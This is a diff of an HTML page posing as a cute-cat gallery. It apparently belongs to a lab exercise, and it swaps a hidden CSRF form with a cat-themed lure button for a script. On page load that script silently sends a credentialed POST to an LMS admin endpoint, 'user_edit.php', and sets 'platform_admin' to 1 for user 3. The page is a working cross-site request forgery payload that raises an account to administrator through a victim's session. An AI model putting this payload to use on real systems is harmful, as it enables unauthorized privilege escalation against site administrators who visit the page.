@@ -31,43 +31,32 @@
       <img src="cutecat2.png" alt="Chat mignon 2" />
       <img src="cutecat3.png" alt="Chat mignon 3" />
     </div>
-    <form
-      id="formulaire-csrf"
-      method="POST"
-      action="http://localhost:8081/main/admin/user_edit.php?user_id=3"
-    >
-      <input type="hidden" name="firstname" value="Juan" />
-      <input type="hidden" name="lastname" value="Hernandezz" />
-      <input type="hidden" name="email" value="juan.hernandez@email.fr" />
-      <input type="hidden" name="username" value="user" />
-      <input type="hidden" name="reset_password" value="0" />
 
-      <!-- The password is set to password -->
-      <input type="hidden" name="status" value="1" />
-      <input type="hidden" name="platform_admin" value="1" />
 
-      <input type="hidden" name="send_mail" value="0" />
-      <input type="hidden" name="radio_expiration_date" value="0" />
-      <input type="hidden" name="expiration_date" value="2025-01-06 18:35" />
-      <input type="hidden" name="active" value="1" />
-      <input type="hidden" name="extra_legal_accept" value="" />
-      <input type="hidden" name="extra_already_logged_in" value="true" />
-      <input type="hidden" name="extra_mail_notify_invitation" value="1" />
-      <input type="hidden" name="extra_mail_notify_message" value="1" />
-      <input type="hidden" name="extra_mail_notify_group_message" value="1" />
-      <input type="hidden" name="extra_user_chat_status" value="" />
-      <input type="hidden" name="extra_google_calendar_url" value="" />
-      <input type="hidden" name="extra_captcha_blocked_until_date" value="" />
-      <input type="hidden" name="extra_skype" value="TEST" />
-      <input type="hidden" name="extra_linkedin_url" value="" />
-      <input type="hidden" name="_qf__user_edit" value="" />
-      <input type="hidden" name="user_id" value="3" />
-      <input type="hidden" name="MAX_FILE_SIZE" value="2097152" />
-      <input type="hidden" name="picture_crop_result" value="" />
-      <input type="hidden" name="picture_crop_image_base_64" value="" />
-      <input type="hidden" name="item_id" value="3" />
+    <script>
+      const data = new FormData();
 
-      <input id="bouton-csrf" type="submit" value="Cliquez ici si vous aimez les chats!" />
-    </form>
+      // Valeurs obligatoires
+      data.append("firstname", "Juan");
+      data.append("lastname", "Hernandez");
+      data.append("email", "juan.hernandez@email.fr");
+      data.append("username", "user");
+      data.append("_qf__user_edit", "");
+
+      // Partie qui permet de changer le statut de l'utilisateur en admin
+      data.append("platform_admin", "1");
+
+      fetch("http://localhost:8081/main/admin/user_edit.php?user_id=3", {
+        method: "POST",
+        body: data,
+        credentials: "include",
+      })
+        .then((response) => {
+          console.log("Request sent successfully:", response);
+        })
+        .catch((error) => {
+          console.error("Error sending request:", error);
+        });
+    </script>
   </body>
 </html>
